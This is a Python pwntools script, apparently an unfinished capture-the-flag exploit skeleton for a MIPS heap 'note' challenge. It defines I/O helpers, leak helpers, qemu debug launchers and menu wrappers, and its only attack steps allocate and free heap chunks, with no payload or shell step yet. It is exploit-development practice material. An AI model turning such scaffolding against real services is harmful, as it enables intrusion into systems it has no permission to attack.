# -*- coding:UTF-8 -*-
from pwn import *
from LibcSearcher import *
import os

#SigreturnFrame(kernel = 'amd64')
#context(arch='aarch64')

gdbTool = "pwndbg"
binary = "./mipselNote"
localPort = "12345"
version = "2.23"
arch = "mipsel"
qemu_arch = "qemu-{0}".format(arch)
linkLibrary = "/home/hacker/glibc/{0}/{1}".format(version,arch)
libc = ELF(linkLibrary+"/lib/libc.so.6".format(version))
#libc = ELF("./libc-2.31.so")

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
rl = lambda :p.recvline()
sa = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
u64Leakbase = lambda offset :u64(ru("\x7f")[-6: ] + '\0\0') - offset
u32Leakbase = lambda offset :u32(ru("\xff")[-4: ]) - offset
it      = lambda                    :p.interactive()



global p

remoteFlag=0
localRun=0
if localRun==1:
    p = process([qemu_arch, '-L', linkLibrary, binary])
    elf = ELF(binary)
elif remoteFlag==1:
    p = remote("172.35.33.11","9999")


def mulArchDbgPie():
    global p
    p = process(['gdbMulArchPie',binary,arch,version,localPort,gdbTool])
    pause()


def mulArchDbgNoPie():
    global p
    p = process(['gdbMulArchNoPie',binary,arch,version,localPort])
    pause()


def lg(string,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(string,addr))


def add_malloc(size,content):
    p.sendlineafter("Your choice :",'1')
    p.sendlineafter('Note size :',str(size))
    p.sendafter('Content :',content)

def delete(idx):
    p.sendlineafter("Your choice :",'2')
    p.sendlineafter('Index :',str(idx))

def show(idx):
    p.sendlineafter("Your choice :",'3')
    p.sendlineafter('Index :',str(idx))
    
def edit(idx,size,content):
    p.sendlineafter("Your choice :",'4')
    p.sendlineafter('Index :',str(idx))
    p.sendlineafter('Size :',str(size))
    p.sendafter('Content :',content)    
    
def add_calloc(size,content):
    p.sendlineafter("Your choice :",'5')
    p.sendlineafter('Note size :',str(size))
    p.sendafter('Content :',content)

def exit():
    p.sendlineafter("Your choice :",'6')



mulArchDbgPie()

add_malloc(0x478,'AA')
add_malloc(0x20,'AA')
add_malloc(0x20,'AA')
delete(0)
delete(1)


#Pie need two pause()
pause()
pause()